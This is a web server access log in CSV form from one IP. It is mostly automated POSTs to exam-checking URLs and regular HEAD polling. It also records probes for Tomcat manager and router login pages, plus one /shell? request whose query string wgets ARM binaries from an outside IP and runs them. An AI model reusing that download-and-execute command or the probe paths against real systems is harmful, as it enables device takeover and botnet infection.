ip,timestamp,timezone,request,slash,http,status
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:08,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:09,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:10,+0000,POST,/exam/171/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:11,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:12,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:28:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:29:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:29:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:30:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:30:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:31:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:31:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:32:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:32:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:33:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:33:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:34:17,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:34:47,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:35:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:35:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:36:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:36:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:37:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:37:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:38:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:38:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:39:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:39:45,+0000,GET,/manager/text/list,HTTP/1.1,404
103.44.12.218,19/Mar/2021:14:39:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:40:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:40:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:41:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:41:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:42:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:42:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:43:16,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:43:45,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:44:15,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:44:46,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:44:53,+0000,POST,/boaform/admin/formLogin,HTTP/1.1,404
103.44.12.218,19/Mar/2021:14:44:53,+0000,400,0,
103.44.12.218,19/Mar/2021:14:45:15,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:45:45,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:46:15,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:46:44,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:47:14,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:47:44,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:48:14,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:48:44,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:49:14,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:49:44,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:50:14,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:50:44,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:51:13,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:51:43,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:52:13,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:52:43,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:53:13,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:53:43,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:54:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:54:43,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:55:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:55:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:56:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:56:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:57:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:57:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:58:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:58:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:59:11,+0000,GET,/shell?cd+/tmp;rm+arm+arm7;wget+http:/\x5C/45.14.149.244/bins/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\x5C/45.14.149.244/bins/arm;chmod+777+arm;./arm+jaws,HTTP/1.1,400
103.44.12.218,19/Mar/2021:14:59:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:14:59:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:00:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:00:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:01:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:01:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:02:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:02:41,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:03:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:03:43,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:04:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:04:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:05:10,+0000,POST,/boaform/admin/formLogin,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:05:10,+0000,400,0,
103.44.12.218,19/Mar/2021:15:05:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:05:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:06:11,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:06:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:07:11,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:07:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:08:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:08:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:09:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:09:42,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:09,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:09,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:09,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:09,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:09,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:10,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:10,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:10,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:10,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:10,+0000,POST,/exam/162/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:12,+0000,HEAD,/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:18,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:18,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:18,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:18,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:18,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:18,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,403
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/174/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,403
103.44.12.218,19/Mar/2021:15:10:19,+0000,GET,/exam/login/?next=/exam/174/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:19,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:20,+0000,GET,/exam/login/?next=/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:20,+0000,GET,/exam/login/?next=/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/161/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/163/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:20,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:21,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:21,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:21,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:21,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:21,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:21,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:22,+0000,GET,/exam/login/?next=/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/169/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/167/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,302
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,GET,/exam/login/?next=/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,403
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/168/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:22,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:23,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,403
103.44.12.218,19/Mar/2021:15:10:23,+0000,POST,/exam/170/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:24,+0000,POST,/exam/164/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:24,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:24,+0000,POST,/exam/166/check/1/6/16/16/,HTTP/1.1,404
103.44.12.218,19/Mar/2021:15:10:24,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,200
103.44.12.218,19/Mar/2021:15:10:24,+0000,POST,/exam/165/check/1/6/16/16/,HTTP/1.1,403
